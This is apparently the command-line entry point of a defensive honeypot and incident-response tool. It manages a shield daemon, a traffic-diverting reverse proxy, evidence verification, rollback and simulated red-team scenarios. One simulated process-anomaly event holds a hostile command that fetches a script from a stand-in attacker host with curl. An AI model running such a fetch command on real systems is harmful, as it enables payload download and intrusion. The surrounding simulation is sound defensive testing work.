import asyncio
from datetime import datetime, timezone
import sys
from uuid import uuid4
import typer
from rich.console import Console

from cli.ui import print_banner, print_incidents, print_status
from core.engine import MirrorEngine
from core.models import MirrorEvent
from lab.runners.atomic_runner import AtomicRedTeamRunner

from pathlib import Path
from typing import Any, Dict, Optional, Tuple
from core.daemon import DaemonSupervisor
from mirror.traffic_switch import TrafficSwitch

app = typer.Typer(help="🪞 Dimensión Espejo: Developer Shield CLI")
daemon_app = typer.Typer(help="Manage 24/7 background Shield daemon process")
app.add_typer(daemon_app, name="daemon")

console = Console()

# Singleton engine instance for CLI operations
_engine = MirrorEngine()
_atomic_runner = AtomicRedTeamRunner()


@app.callback(invoke_without_command=True)
def main(ctx: typer.Context) -> None:
    if ctx.invoked_subcommand is None:
        print_banner()
        print_status(_engine.get_status())


@daemon_app.command(name="start")
def daemon_start(
    asset_id: str = typer.Option("api", "--asset", "-a", help="Asset ID to protect"),
    port: int = typer.Option(8080, "--port", "-p", help="Port to listen on publicly"),
    host: str = typer.Option("127.0.0.1", "--host", "-h", help="Host address to bind to"),
    tls: bool = typer.Option(False, "--tls", help="Enable TLS/HTTPS encryption"),
) -> None:
    """Start the Dimensión Espejo Shield as a background daemon."""
    print_banner()
    supervisor = DaemonSupervisor()
    res = supervisor.start_daemon(asset_id=asset_id, port=port, host=host, tls=tls)
    if res.get("status") == "STARTED":
        console.print(f"[bold green]✔ Shield Daemon started successfully (PID: {res['pid']})[/bold green]")
        console.print(f"   [dim]Listening on:[/dim] [bold cyan]{res['host']}:{res['port']}[/bold cyan]")
        console.print(f"   [dim]Log file:[/dim] {res['log_file']}\n")
    else:
        console.print(f"[bold yellow]{res.get('message')}[/bold yellow]\n")


@daemon_app.command(name="stop")
def daemon_stop() -> None:
    """Stop the background Shield daemon process."""
    print_banner()
    supervisor = DaemonSupervisor()
    res = supervisor.stop_daemon()
    if res.get("status") == "STOPPED":
        console.print(f"[bold green]✔ {res.get('message')}[/bold green]\n")
    else:
        console.print(f"[bold yellow]{res.get('message')}[/bold yellow]\n")


@daemon_app.command(name="status")
def daemon_status() -> None:
    """Check background Shield daemon liveness and socket health."""
    print_banner()
    supervisor = DaemonSupervisor()
    info = supervisor.get_status()
    if info.get("running"):
        healthy_str = "[bold green]HEALTHY (Responsive)[/bold green]" if info.get("healthy") else "[bold yellow]RUNNING (Socket starting...)[/bold yellow]"
        console.print(f"[bold green]● Shield Daemon ACTIVE (PID {info.get('pid')})[/bold green]")
        console.print(f"   [dim]Health:[/dim] {healthy_str}")
        console.print(f"   [dim]Endpoint:[/dim] [bold cyan]{info.get('host')}:{info.get('port')}[/bold cyan]")
        console.print(f"   [dim]Asset:[/dim] [bold]{info.get('asset_id')}[/bold]")
        console.print(f"   [dim]TLS Mode:[/dim] {'Enabled' if info.get('tls') else 'Disabled'}")
        console.print(f"   [dim]Started At:[/dim] {info.get('started_at')}\n")
    else:
        console.print("[bold red]○ Shield Daemon INACTIVE (Not running)[/bold red]\n")


@app.command(name="status")
def status() -> None:
    """Display the current matrix of protected assets, threats, and canaries."""
    print_banner()
    print_status(_engine.get_status())


@app.command(name="incidents")
def list_incidents() -> None:
    """Show all security incidents correlated by the Mirror Core."""
    print_banner()
    incidents_data = [i.model_dump() for i in _engine.incidents.list_all()]
    print_incidents(incidents_data)


@app.command(name="verify")
def verify_incident(
    incident_id: str = typer.Argument(..., help="Incident ID to verify (e.g. 'INC-2026-0001')")
) -> None:
    """Verify cryptographic SHA-256 integrity seal for an evidence manifest."""
    print_banner()
    res = _engine.forensics.verify_manifest(incident_id)
    if res.get("verified"):
        console.print(f"[bold green]✔ EVIDENCE INTEGRITY CONFIRMED for {incident_id}[/bold green]")
        console.print(f"   [dim]Target:[/dim] {res.get('target')}")
        console.print(f"   [dim]Captured At:[/dim] {res.get('captured_at')}")
        console.print(f"   [dim]SHA-256 Seal:[/dim] [cyan]{res.get('stored_seal')}[/cyan]")
        console.print(f"   [dim]Manifest File:[/dim] {res.get('manifest_path')}")
    else:
        console.print(f"[bold red]✖ INTEGRITY COMPROMISED / INVALID for {incident_id}[/bold red]")
        console.print(f"   [dim]Error:[/dim] {res.get('error', 'Hash mismatch')}")
        if "stored_seal" in res:
            console.print(f"   [dim]Stored Seal:[/dim] {res.get('stored_seal')}")
            console.print(f"   [dim]Calculated Hash:[/dim] {res.get('calculated_hash')}")
        raise typer.Exit(code=1)


@app.command(name="routes")
def list_routes() -> None:
    """Display the active traffic switch routing table (Real vs Mirror upstream)."""
    print_banner()
    routes = _engine.traffic_switch.list_routes()
    from rich.table import Table

    table = Table(title="Traffic Switch Active Routing Table", header_style="bold magenta")
    table.add_column("Asset ID", style="bold cyan")
    table.add_column("Primary Upstream", style="green")
    table.add_column("Mirror Upstream", style="yellow")
    table.add_column("Active Target", style="bold")
    table.add_column("State", style="bold")
    table.add_column("Diverted Req", justify="right")

    for asset_id, r in routes.items():
        state = "[bold red]DIVERTED (MIRROR)[/bold red]" if r["is_diverted"] else "[bold green]PRIMARY (REAL)[/bold green]"
        active_color = "red" if r["is_diverted"] else "green"
        table.add_row(
            asset_id.upper(),
            r["primary"],
            r["mirror"] or "-",
            f"[{active_color}]{r['active']}[/{active_color}]",
            state,
            str(r["diverted_requests"]),
        )
    console.print(table)


@app.command(name="proxy")
def start_proxy(
    asset_id: str = typer.Argument("api", help="Asset ID to proxy traffic for (default: 'api')"),
    port: int = typer.Option(8080, "--port", "-p", help="Port to listen on publicly"),
    host: str = typer.Option("127.0.0.1", "--host", "-h", help="Host address to bind to"),
    tls: bool = typer.Option(False, "--tls", help="Enable TLS/HTTPS termination"),
    cert: Optional[Path] = typer.Option(None, "--cert", help="Path to PEM TLS certificate"),
    key: Optional[Path] = typer.Option(None, "--key", help="Path to PEM TLS private key"),
) -> None:
    """Start the live dynamic reverse proxy to route public traffic to the real app or mirror clone."""
    print_banner()
    route = _engine.traffic_switch.get_route(asset_id)
    primary = route.primary_target if route else f"{asset_id}:8000"

    ssl_context = None
    mode_label = "HTTP/TCP"
    if tls:
        mode_label = "HTTPS/TLS"
        if cert and key:
            ssl_context = TrafficSwitch.create_ssl_context(cert, key)
            console.print(f"   [dim]TLS Cert:[/dim] {cert}")
        else:
            cert_dir = _engine.config_dir / "certs"
            c_path, k_path = TrafficSwitch.generate_self_signed_cert(cert_dir)
            ssl_context = TrafficSwitch.create_ssl_context(c_path, k_path)
            console.print(f"   [dim]TLS Notice:[/dim] [yellow]Using self-signed certificate for dev/staging[/yellow]")

    console.print(f"[bold green]🚀 Dimensión Espejo Dynamic Reverse Proxy ONLINE[/bold green]")
    console.print(f"   [dim]Listening on:[/dim] [bold cyan]{host}:{port}[/bold cyan] ({mode_label})")
    console.print(f"   [dim]Protected Asset:[/dim] [bold]{asset_id}[/bold]")
    console.print(f"   [dim]Active Upstream:[/dim] [bold yellow]{primary}[/bold yellow]")
    console.print(f"   [dim]Mode:[/dim] Seamless Zero-Drop Diversion")
    console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    async def _run() -> None:
        server = await _engine.traffic_switch.start_proxy_server(host, port, asset_id, ssl_context=ssl_context)
        async with server:
            await server.serve_forever()

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Proxy stopped.[/bold yellow]")


@app.command(name="rollback")
def rollback_cmd(
    incident_id: str = typer.Argument(..., help="Incident ID to remediate and rollback (e.g. 'INC-2026-0001')")
) -> None:
    """Safely restore a contained asset back to clean baseline and restore real traffic."""
    print_banner()
    res = _engine.rollback_incident(incident_id)
    if res.get("status") == "SUCCESS":
        console.print(f"[bold green]✔ ROLLBACK SUCCESSFUL for {incident_id}[/bold green]")
        for rep in res.get("reports", []):
            console.print(f"   [dim]Asset:[/dim] [bold]{rep['asset_id']}[/bold]")
            console.print(f"   [dim]Traffic Restored:[/dim] {rep['traffic_restored']}")
            console.print(f"   [dim]Mirror Cleaned:[/dim] {rep['mirror_destroyed']}")
            console.print(f"   [dim]Incident Status:[/dim] [bold green]RESOLVED[/bold green]")
    else:
        console.print(f"[bold red]✖ ROLLBACK FAILED: {res.get('error')}[/bold red]")
        raise typer.Exit(code=1)


@app.command(name="up")
def up() -> None:
    """Start the Dimensión Espejo Developer Shield in the foreground."""
    print_banner()
    console.print("[bold green]● Starting Dimensión Espejo Developer Shield in foreground...[/bold green]")
    console.print("[dim]Activating honeypots, FIM canary watcher, and Docker event monitor...[/dim]")
    console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    async def _run() -> None:
        await _engine.start()
        print_status(_engine.get_status())
        stop_event = asyncio.Event()
        try:
            await stop_event.wait()
        except (asyncio.CancelledError, KeyboardInterrupt):
            pass
        finally:
            await _engine.stop()

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Developer Shield stopped gracefully.[/bold yellow]\n")


@app.command(name="lab")
def lab_run(
    scenario: str = typer.Argument(
        ...,
        help="Scenario or MITRE Technique to simulate (e.g. 'canary-trigger', 'container-escape', or 'T1552.001')",
    )
) -> None:
    """Simulate a controlled Red Team attack scenario using cloned Atomic Red Team tests."""
    print_banner()
    console.print(f"[bold red]🧪 Launching simulation scenario: '{scenario}'[/bold red]\n")

    event = None
    # 1. Check if scenario is a MITRE ATT&CK technique from cloned atomic-red-team
    if scenario.upper().startswith("T"):
        technique_id = scenario.upper()
        event = _atomic_runner.create_event_from_technique(technique_id, test_index=0, asset_id="secrets")
        if not event:
            console.print(f"[bold red]Technique {technique_id} could not be loaded from lab/atomics[/bold red]")
            raise typer.Exit(code=1)
        console.print(f"📖 Loaded MITRE Technique: [bold yellow]{event.evidence.get('display_name')}[/bold yellow] ({technique_id})")

    elif scenario == "canary-trigger":
        event = MirrorEvent(
            id=uuid4(),
            timestamp=datetime.now(timezone.utc),
            source="canary",
            sensor="decoy_file",
            event_type="canary_trigger",
            attack_stage="credential_access",
            asset_id="secrets",
            severity="critical",
            confidence=0.99,
            path=".env.backup",
            evidence={"action": "read", "caller_uid": 1000},
        )
    elif scenario == "container-escape":
        event = MirrorEvent(
            id=uuid4(),
            timestamp=datetime.now(timezone.utc),
            source="docker",
            sensor="docker_events",
            event_type="container_escape",
            attack_stage="privilege_escalation",
            asset_id="api",
            container_id="developer-api",
            severity="critical",
            confidence=0.95,
            evidence={"syscall": "sys_ptrace", "privilege": "cap_sys_admin"},
        )
    elif scenario == "port-probe":
        event = MirrorEvent(
            id=uuid4(),
            timestamp=datetime.now(timezone.utc),
            source="opencanary",
            sensor="fake_port",
            event_type="fake_port_probe",
            attack_stage="discovery",
            asset_id="redis",
            severity="high",
            confidence=0.88,
            source_ip="192.168.1.105",
            evidence={"target_port": 16379, "payload": "PING\\r\\n"},
        )
    elif scenario == "process-anomaly":
        event = MirrorEvent(
            id=uuid4(),
            timestamp=datetime.now(timezone.utc),
            source="osquery",
            sensor="process_monitor",
            event_type="process_anomaly",
            attack_stage="execution",
            asset_id="postgres",
            container_id="developer-postgres",
            severity="high",
            confidence=0.80,
            command="/bin/sh -c 'curl attacker.com/exploit.sh'",
            process="sh",
        )
    elif scenario in ("aggressive-apt", "apt", "ransomware"):
        from lab.scenarios.aggressive_apt import AggressiveAPTScenario

        console.print("[bold yellow]⚡ EXECUTING HIGH-VELOCITY APT MULTI-STAGE KILL-CHAIN ATTACK[/bold yellow]\n")
        apt_scenario = AggressiveAPTScenario(_engine)
        results = asyncio.run(apt_scenario.execute())

        for idx, (title, ev, decision) in enumerate(results, start=1):
            action_color = "red" if decision.threat.value in ("critical", "high") else "yellow"
            console.print(f"[{action_color}]▶ [{idx}/5] {title}[/{action_color}]")
            console.print(
                f"   [dim]Target:[/dim] [bold]{ev.asset_id}[/bold] | "
                f"[dim]Sensor:[/dim] {ev.sensor} | "
                f"[dim]Threat Decision:[/dim] [{action_color}]{decision.threat.value.upper()}[/{action_color}] ➔ "
                f"[bold magenta]{decision.action.value.upper()}[/bold magenta]"
            )
            if ev.command:
                console.print(f"   [dim]Command:[/dim] [italic yellow]{ev.command}[/italic yellow]")
            console.print()

        console.print("[bold green]✔ Attack burst complete. Defense Shield active and evidence sealed.[/bold green]\n")
        console.print("[bold]Current Post-Incident State:[/bold]")
        print_status(_engine.get_status())
        print_incidents([i.model_dump() for i in _engine.incidents.list_all()])
        return
    else:
        console.print(f"[bold yellow]Unknown scenario '{scenario}'. You can use: aggressive-apt, canary-trigger, container-escape, port-probe, or any technique like T1552.001[/bold yellow]")
        raise typer.Exit(code=1)

    console.print(f"1. [cyan]Event Emitted:[/cyan] [bold]{event.event_type}[/bold] (Sensor: {event.sensor}, Confidence: {event.confidence * 100:.0f}%)")

    # Ingest event through engine
    asyncio.run(_engine.ingest_event(event))

    console.print("2. [cyan]Policy Evaluation:[/cyan] Rule matched and Threat Decision calculated.")
    console.print("3. [cyan]Orchestrator Executed:[/cyan] Containment, Forensics, and Mirror Pipeline invoked.")

    # Show resulting status and incidents
    console.print("\n[bold]Current Post-Incident State:[/bold]")
    print_status(_engine.get_status())
    print_incidents([i.model_dump() for i in _engine.incidents.list_all()])


if __name__ == "__main__":
    app()
